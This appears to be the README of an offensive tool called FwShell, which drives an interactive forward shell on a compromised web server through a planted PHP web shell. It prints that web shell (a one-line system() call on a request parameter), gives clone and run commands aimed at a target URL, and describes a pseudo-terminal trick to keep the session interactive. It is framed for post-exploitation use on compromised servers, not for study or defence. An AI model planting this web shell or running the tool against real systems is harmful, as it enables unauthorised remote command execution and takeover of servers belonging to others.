## üëæ Description

This script establishes a remote shell session that allows the execution of commands on the server interactively, handling output and state dynamically. Since some servers don't allow to get $reserse~shell$ due to their configuration, this script is a friendly alternative.

The remote server must be configured to allow command execution or simply get a *PHP* structure loaded on the compromised server.

```php
<?php
    system($_REQUEST['cmd']); # use too, $_GET
?>
```

Take into account the path to the compromised server, where the bug or our *PHP* script is located.

## üéâ Features:
- **Remotely execute commands:** Sends shell commands to the remote server and receives the results in real time.

- **Interactive shell:** Allows you to interact with the remote system similar to a local terminal.

- **Pseudo-terminal management:** You can use a pseudo-terminal (script /dev/null -c /bin/bash) to keep the session interactive.

- **Command history management:** The script keeps a history of the commands executed during the session.

- **Configurable execution intervals:** The interval between command executions can be adjusted.

- **Session termination:** At the end of the session, the scriptdeletes temporary files.

## üíª Usage

First download the code

```bash
git clone --no-checkout http://github.com/ch4rum/FwShell.git
```
To run the script, you can use the following command:

```bash
python3 main.py -u <URL> -i <interval>
```

* `-u` o `--url` \<URL> is the Url of the remote server.

* `-i` o `--interval` \<interval> is an optional parameter that sets the interval (in seconds) between command execution. If not specified, the default value is $0.5$ seconds.

To exit the session, you can run `ctrl + c`.
